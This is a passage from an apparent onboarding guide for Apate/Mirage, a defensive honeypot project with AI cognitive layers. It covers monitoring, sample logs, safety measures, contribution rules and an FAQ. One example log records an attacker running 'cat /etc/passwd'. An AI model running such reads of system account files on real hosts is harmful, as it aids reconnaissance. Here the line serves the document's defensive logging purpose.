apate_request_latency_seconds_bucket{method="POST",path="/api/v1/honeypot/ssh/interact",le="0.05"} 140

# Active sessions
honeypot_active_sessions 7
```

### Grafana Dashboards

Pre-built dashboards available in `deployment/grafana/`:
- **MTTD Overview**: Real-time MTTD tracking, session distribution
- **Layer Performance**: Latency breakdown by cognitive layer
- **Attacker Classification**: Distribution of attacker types
- **Honeytoken Activity**: Triggered tokens, access patterns

### Logs

Structured JSON logs for ELK ingestion:

```json
{
  "timestamp": "2025-12-17T10:30:00Z",
  "level": "INFO",
  "service": "ssh_emulator",
  "session_id": "abc123",
  "source_ip": "192.168.1.100",
  "event": "command_execution",
  "command": "cat /etc/passwd",
  "response_length": 1024,
  "threat_score": 0.3
}
```

---

## Security & Safety

### Production Security Stack

See `docs/SECURITY.md` for complete details.

**Key Features**:
1. **Network Isolation**: Container subnet (172.20.0.0/16) with egress blocking
2. **Advanced Firewall**: `scripts/advanced_firewall.sh` with dynamic threat detection
3. **Container Hardening**: Non-root, capability dropping, read-only FS
4. **Secrets Management**: AES-256 encryption, automated rotation
5. **Runtime Monitoring**: Falco + Wazuh HIDS
6. **Incident Response**: Automated playbooks, alerting

### AI Safety Constraints

See `docs/SAFETY_AND_STABILITY_PLAN.md`.

**Key Safeguards**:
1. **Input Sanitization**: All attacker input is validated/escaped before processing
2. **Output Sanitization**: AI responses are filtered for harmful content
3. **Prompt Injection Defense**: Separate system/user message boundaries
4. **Blue Team Verification**: Secondary LLM validates Layer 4 output (future)
5. **Rate Limiting**: Max 10 LLM calls per session to prevent runaway costs
6. **Circuit Breaker**: Automatic degradation under load or errors
7. **Value Clipping**: Probability outputs are clamped to [0.001, 0.999]

---

## Contributing Guidelines

### Code Style

- **Python**: Black formatter, isort imports, type hints, docstrings
- **Rust**: `cargo fmt`, `cargo clippy --` -D warnings
- **Go**: `go fmt`, `golangci-lint run`

### Branching Strategy

- `main` - Production-ready code
- `develop` - Integration branch
- `feature/*` - New features
- `bugfix/*` - Bug fixes
- `docs/*` - Documentation updates

### Pull Request Process

1. Fork repository
2. Create feature branch from `develop`
3. Write tests for new code (target >80% coverage)
4. Run `scripts/ci_check.py` to validate locally
5. Submit PR with clear description
6. Address review feedback
7. Squash commits before merge

### Testing Requirements

- All new code must have unit tests
- Integration tests for API changes
- Performance benchmarks for Layer 0 changes
- Documentation updates for user-facing features

### Documentation Requirements

- Docstrings for all public functions/classes
- Update relevant docs/ files
- Add examples to usage.md if applicable
- Update AI_Engine_Plan.md for cognitive layer changes

---

## Next Steps & Learning Path

### For New Contributors

1. **Start Here**:
   - Read `README.md` for project overview
   - Read `docs/FOUNDATIONS.md` for technical details
   - Read `docs/AI_Engine_Plan.md` for roadmap
   - Complete this onboarding guide

2. **Hands-On**:
   - Follow [Development Setup](#development-setup)
   - Run `demo_reducers.py` to see Layer 0 in action
   - Interact with SSH/HTTP honeypots manually
   - Read test files to understand expected behavior

3. **Pick a Component**:
   - **Backend**: Python, FastAPI, databases
   - **Layer 0**: Rust, performance, protocols
   - **AI/ML**: NumPy, scikit-learn, PyTorch (future)
   - **Infrastructure**: Docker, Kubernetes, monitoring

4. **Find an Issue**:
   - Check GitHub Issues for `good-first-issue` label
   - Ask in Discussions for guidance
   - Review `docs/progress.md` for current priorities

### For Researchers

Key areas for investigation:
- **MTTD Optimization**: Novel techniques for delaying discovery
- **Attacker Modeling**: Better classification/prediction algorithms
- **Fingerprint Resistance**: Defeating advanced honeypot detection
- **Cognitive Architecture**: Improvements to cascading short-circuit
- **Reinforcement Learning**: Optimal engagement strategies

### For Security Professionals

Potential use cases:
- **Threat Intelligence**: Study attacker TTPs in controlled environment
- **Detection Validation**: Test IDS/IPS rules against live attacks
- **Incident Response**: Practice handling incidents safely
- **Red Team Training**: Honeypot evasion techniques
- **Research**: Academic studies on deception techniques

---

## Resources & References

### Internal Documentation
- **[Technical Foundations](FOUNDATIONS.md)** - Architecture deep dive
- **[AI Engine Plan](AI_Engine_Plan.md)** - Complete roadmap (685 lines)
- **[API Reference](API.md)** - REST API documentation
- **[Security Implementation](SECURITY.md)** - Production security
- **[Deployment Guide](DEPLOYMENT.md)** - Kubernetes/cloud deployment
- **[Usage Guide](usage.md)** - Operational guide
- **[Layer 0 Reducers](../rust-protocol/REDUCERS.md)** - Rust implementation details

### External Resources
- **Honeypot Research**: SANS Institute, FIRST, MITRE ATT&CK
- **Machine Learning**: scikit-learn docs, PyTorch tutorials
- **Reinforcement Learning**: Spinning Up in Deep RL (OpenAI)
- **Rust Performance**: The Rust Performance Book
- **Security Hardening**: CIS Benchmarks, NIST guidelines

### Community
- **GitHub Issues**: Bug reports, feature requests
- **GitHub Discussions**: Q&A, ideas, show-and-tell
- **Discord** (planned): Real-time chat with contributors

---

## FAQ

**Q: Is this production-ready?**  
A: The foundation (Apate Core + Layer 0) is production-ready. Cognitive layers (1-4) are in development (Q1-Q4 2026).

**Q: What's the difference between Apate and Mirage?**  
A: "Apate" is the codebase/foundation. "Mirage" is the five-layer cognitive architecture being built on top.

**Q: Why Rust for Layer 0?**  
A: Sub-millisecond performance requirements. 80% of traffic is noise that must be filtered instantly.

**Q: Can I use this for commercial purposes?**  
A: Yes, under MIT License. Attribution appreciated but not required.

**Q: How much does it cost to run?**  
A: Development: Free (local). Production: ~$50-100/month (cloud + LLM APIs in future).

**Q: Is the AI dangerous?**  
A: No. Multiple safety layers prevent harmful outputs. See `SAFETY_AND_STABILITY_PLAN.md`.

**Q: Can attackers tell it's a honeypot?**  
A: Not easily. MTTD target is 45-60 minutes (vs 2-5 for static honeypots). Continuous fingerprint resistance research.

**Q: How do I contribute?**  
A: See [Contributing Guidelines](#contributing-guidelines). Good first issues are labeled on GitHub.

**Q: What's the current status?**  
A: Foundation complete (87%), Layer 0 complete (100%), Layer 1 in progress (10%). See `docs/progress.md`.

---

**Welcome to the team! 🎉**

Questions? Open a Discussion on GitHub or reach out to maintainers.
